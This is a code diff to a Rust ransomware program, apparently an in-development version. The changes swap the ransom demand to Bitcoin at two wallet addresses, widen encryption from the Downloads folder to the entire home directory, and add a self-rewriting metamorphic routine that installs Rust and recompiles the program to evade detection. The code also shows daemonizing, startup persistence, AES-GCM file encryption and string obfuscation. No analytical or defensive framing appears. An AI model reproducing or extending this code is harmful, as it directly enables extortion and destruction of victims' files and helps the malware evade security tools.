@@ -85,13 +85,20 @@ impl App for mikasaUI {
                                     .strong(),
                             );
                             r_ui.label(
-                                RichText::new(lc!("Please send 100 USDT to the following address:"))
+                                RichText::new(lc!("Please send 0.003 BTC to the following address:"))
                                     .color(Color32::WHITE)
                                     .size(16.0),
                             );
                             r_ui.add_space(10.0);
-                            r_ui.code(lc!("1HqYy3oB1c2nXNkL8XzvM3rF5TfESuK9uE"));
+                            r_ui.code(lc!("1LACmsR1mU6WLKzALMqkLxRjDSNVqoCpzj"));
                             r_ui.add_space(15.0);
+                                r_ui.label(
+                                RichText::new(lc!("Please send 0.001 BTC to the following address:"))
+                                    .color(Color32::WHITE)
+                                    .size(16.0),
+                            );
+                            r_ui.add_space(10.0);
+                            r_ui.code(lc!("bc1qsq2p02m6mtdac7llu798wusrtc9p4mcnu5e9eg"));
                             r_ui.label(
                                 RichText::new(lc!("After payment, click the button below to start decryption."))
                                     .color(Color32::WHITE),
@@ -192,7 +199,7 @@ fn add_to_startup() {
 }
 
 fn get_dir() -> Option<PathBuf> {
-    dirs::home_dir().map(|r_path| r_path.join("Downloads"))
+    dirs::home_dir()
 }
 
 fn encrypt_file(r_path: &PathBuf, r_cipher: &Aes256Gcm) -> io::Result<()> {
@@ -274,16 +281,7 @@ fn entry() -> Result<(), eframe::Error> {
     }
 }
 
-fn main() -> std::io::Result<()> {
-    #[cfg(unix)]
-    {
-        let daemonize = Daemonize::new();
-        if let Err(_e) = daemonize.start() {
-            std::process::exit(1);
-        }
-    }
-
-    entry();
+fn rewrite() -> std::io::Result<()> {
     let r_source_code = include_str!("main.rs");
     let r_toml = r#"
 [package]
@@ -298,7 +296,7 @@ dirs = "6.0.0"
 eframe = "0.31.1"
 epaint = "0.31.1"
 litcrypt = "0.4.0"
-metamorph = "1.0.0"
+metamorph = "1.0.1"
 rand_core = "0.9.3"
 walkdir = "2.5.0"
 "#;
@@ -308,5 +306,22 @@ walkdir = "2.5.0"
 
     metamorph::morph(r_source_code, r_toml, r_junk_code, r_project_name)?;
     Ok(())
+}
+
+fn main() {
+    #[cfg(unix)]
+    {
+        let daemonize = Daemonize::new();
+        if let Err(_e) = daemonize.start() {
+            std::process::exit(1);
+        }
+    }
+    entry();
+    if metamorph::check_rust() {
+        rewrite();
+    } else {
+        metamorph::install_rust();
+        rewrite();
+    }
 }
 // METAMORPHIC_MARKER_END
